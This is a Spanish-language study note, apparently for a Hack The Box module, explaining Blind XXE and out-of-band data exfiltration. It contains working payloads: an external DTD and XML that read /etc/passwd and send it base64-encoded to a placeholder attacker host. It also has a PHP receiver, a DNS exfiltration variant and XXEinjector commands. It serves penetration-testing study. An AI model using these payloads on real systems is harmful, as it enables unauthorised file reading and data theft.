
## 1. ¿Qué es Blind XXE?

Una vulnerabilidad **Blind XXE** se produce cuando una aplicación procesa XML vulnerable a entidades externas, pero no muestra el contenido de las entidades en la respuesta HTTP ni proporciona errores útiles.

En este escenario no podemos recuperar directamente el contenido de los archivos, por lo que necesitamos un canal alternativo.

La técnica principal es **OOB (Out-of-Band Data Exfiltration)**, que permite extraer información mediante solicitudes que el servidor vulnerable envía a un sistema externo controlado por nosotros.

## 2. Exfiltración fuera de banda (OOB)

### Funcionamiento

El proceso general es:

1. Identificar una aplicación vulnerable a XXE.
    
2. Preparar un DTD externo alojado en nuestra máquina.
    
3. Hacer que la aplicación vulnerable solicite ese DTD.
    
4. Definir una entidad que obtenga el contenido del archivo.
    
5. Incluir ese contenido en una solicitud HTTP dirigida a nuestra máquina.
    
6. Capturar la solicitud y recuperar la información.
    

A diferencia de una XXE tradicional, **los datos no necesitan aparecer en la respuesta HTTP de la aplicación vulnerable**.

### Ejemplo: extraer `/etc/passwd`

En el escenario de HTB, se utiliza un filtro PHP para codificar el archivo en Base64 y enviarlo mediante una solicitud HTTP.

El DTD externo contiene:

```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

**Qué hace cada entidad:**

|Elemento|Función|
|---|---|
|`%file`|Obtiene el contenido del archivo y lo codifica en Base64.|
|`%oob`|Define una entidad que genera una solicitud HTTP con los datos codificados.|
|`OUR_IP:8000`|Dirección y puerto del servidor controlado por el auditor.|
|`?content=%file;`|Incorpora el contenido codificado como parámetro de la solicitud.|

Por ejemplo, si el archivo contiene:

```
XXE_SAMPLE_DATA
```

Su representación en Base64 será:

```
WFhFX1NBTVBMRV9EQVRB
```

La solicitud HTTP recibida contendrá esa cadena, que posteriormente puede decodificarse.

## 3. Preparar un servidor para recibir los datos

HTB propone utilizar un pequeño script PHP que reciba el parámetro `content` y registre su contenido decodificado.

Crea un archivo `index.php`:

```
<?php
if (isset($_GET['content'])) {
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

Inicia el servidor PHP en el puerto 8000:

```
php -S 0.0.0.0:8000
```

Este servidor permite recibir las solicitudes HTTP y mostrar el contenido decodificado en sus registros.

**Importante:** la máquina objetivo debe poder alcanzar tu dirección IP y el puerto utilizado.

## 4. Enviar el XML vulnerable

El documento XML del laboratorio carga el DTD externo y referencia la entidad que genera la solicitud:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
    <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
    %remote;
    %oob;
]>
<root>&content;</root>
```

Sustituye `OUR_IP` por la dirección accesible de tu máquina de laboratorio.

### Flujo completo

1. La aplicación vulnerable procesa el XML.
    
2. El servidor carga `xxe.dtd` desde nuestra máquina.
    
3. El DTD define la extracción del archivo.
    
4. La entidad externa genera una solicitud HTTP que contiene los datos codificados.
    
5. Nuestro servidor recibe la solicitud.
    
6. El script PHP decodifica el contenido y lo registra.
    

Si la técnica funciona, podremos recuperar información aunque la aplicación vulnerable solo responda con un mensaje genérico.

## 5. Exfiltración OOB mediante DNS

Otra alternativa es utilizar solicitudes DNS para transmitir información.

En lugar de colocar los datos en un parámetro HTTP, se incorporan al nombre de un subdominio.

Ejemplo conceptual:

```
DATOS_CODIFICADOS.dominio-controlado.example
```

Cuando el servidor vulnerable intenta resolver ese nombre, puede generar una consulta DNS que revele la cadena codificada.

El módulo menciona `tcpdump` como herramienta para capturar tráfico entrante y analizar las consultas.

### Consideraciones

- La técnica requiere que el servidor pueda realizar consultas DNS externas.
    
- Los datos deben codificarse en un formato compatible con los nombres DNS.
    
- Existen límites de longitud y caracteres permitidos.
    
- Es necesario controlar o monitorizar el dominio utilizado.
    

**Diferencia principal:** en OOB HTTP se reciben solicitudes web; en OOB DNS se analizan consultas de resolución de nombres.

## 6. Automatizar la extracción con XXEinjector

El módulo presenta **XXEinjector**, una herramienta que automatiza diferentes técnicas XXE, entre ellas:

- XXE básica.
    
- Exfiltración mediante CDATA.
    
- XXE basada en errores.
    
- Exfiltración OOB a ciegas.
    

Repositorio:

`https://github.com/enjoiz/XXEinjector`

### Paso 1. Descargar la herramienta

```
git clone https://github.com/enjoiz/XXEinjector.git
```

### Paso 2. Preparar la petición HTTP

Copia la solicitud interceptada en Burp Suite y guárdala en un archivo, por ejemplo:

```
/tmp/xxe.req
```

La solicitud debe conservar las cabeceras y la estructura necesarias para reproducir la petición. En el cuerpo, deja la declaración XML y el marcador `XXEINJECT` donde la herramienta deba insertar el payload.

Ejemplo simplificado:

```
POST /blind/submitDetails.php HTTP/1.1
Host: TARGET_IP
Content-Type: text/plain;charset=UTF-8
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

Adapta la ruta, las cabeceras y el formato a la petición real del laboratorio.

### Paso 3. Ejecutar XXEinjector

Ejemplo del módulo:

```
ruby XXEinjector.rb \
    --host=YOUR_TUN0_IP \
    --httpport=8000 \
    --file=/tmp/xxe.req \
    --path=/etc/passwd \
    --oob=http \
    --phpfilter
```

|Parámetro|Función|
|---|---|
|`--host`|IP de nuestra máquina de laboratorio.|
|`--httpport`|Puerto donde recibiremos las solicitudes.|
|`--file`|Archivo que contiene la petición HTTP.|
|`--path`|Archivo que queremos leer.|
|`--oob=http`|Selecciona la técnica OOB mediante HTTP.|
|`--phpfilter`|Utiliza el filtro PHP para codificar el contenido.|

La herramienta automatiza la generación de los payloads y las solicitudes necesarias para intentar recuperar el archivo.

### Paso 4. Consultar los resultados

Según el módulo, los archivos extraídos se guardan en el directorio `Logs`.

Ejemplo:

```
cat Logs/TARGET_IP/etc/passwd.log
```

La ruta exacta depende de la estructura de directorios creada por la herramienta.

## 7. Comparación de las técnicas XXE

|Técnica|¿Se necesita salida en la respuesta?|¿Se necesitan errores visibles?|Método|
|---|---|---|---|
|XXE básica|Sí|No|La entidad se refleja en la respuesta.|
|CDATA|Sí, para recuperar el contenido directamente|No|Se intenta extraer el archivo como datos de texto.|
|Error-Based XXE|No|Sí|Se intenta revelar el contenido mediante errores.|
|Blind XXE con OOB|No|No|Se envía la información a un sistema externo.|
|OOB DNS|No|No|Se utilizan consultas DNS como canal alternativo.|

## 8. Metodología para el examen

Cuando identifiques una posible XXE, sigue este orden:

1. **Identifica la entrada XML:** intercepta la petición y localiza los elementos controlados por el usuario.
    
2. **Comprueba la reflexión:** intenta determinar si las entidades se procesan y aparecen en la respuesta.
    
3. **Analiza los errores:** si no hay salida, comprueba si la aplicación revela errores útiles.
    
4. **Prueba técnicas avanzadas:** evalúa CDATA o Error-Based XXE según el comportamiento observado.
    
5. **Si no hay salida ni errores útiles, considera Blind XXE:** utiliza OOB HTTP o DNS si el entorno permite las conexiones necesarias.
    
6. **Automatiza cuando sea conveniente:** XXEinjector permite probar distintos métodos de extracción.
    
7. **Verifica los resultados:** comprueba los registros del servidor receptor y los archivos recuperados.
    

### Chuleta rápida

- **Blind XXE:** el servidor procesa la entrada vulnerable, pero no devuelve el contenido ni errores útiles.
    
- **OOB:** permite extraer datos mediante un canal externo.
    
- **PHP Base64 Filter:** codifica el contenido para facilitar su transmisión.
    
- **DTD externo:** permite definir entidades que la aplicación vulnerable carga desde nuestra máquina.
    
- **OOB HTTP:** los datos se transmiten en solicitudes HTTP.
    
- **OOB DNS:** los datos pueden transmitirse mediante consultas DNS.
    
- **XXEinjector:** automatiza distintos métodos de explotación XXE.
    

**Idea clave:** cuando una XXE no ofrece salida directa, no significa necesariamente que no sea explotable. Si el servidor puede realizar solicitudes externas y el analizador permite procesar las entidades necesarias, la exfiltración fuera de banda puede proporcionar un canal alternativo.
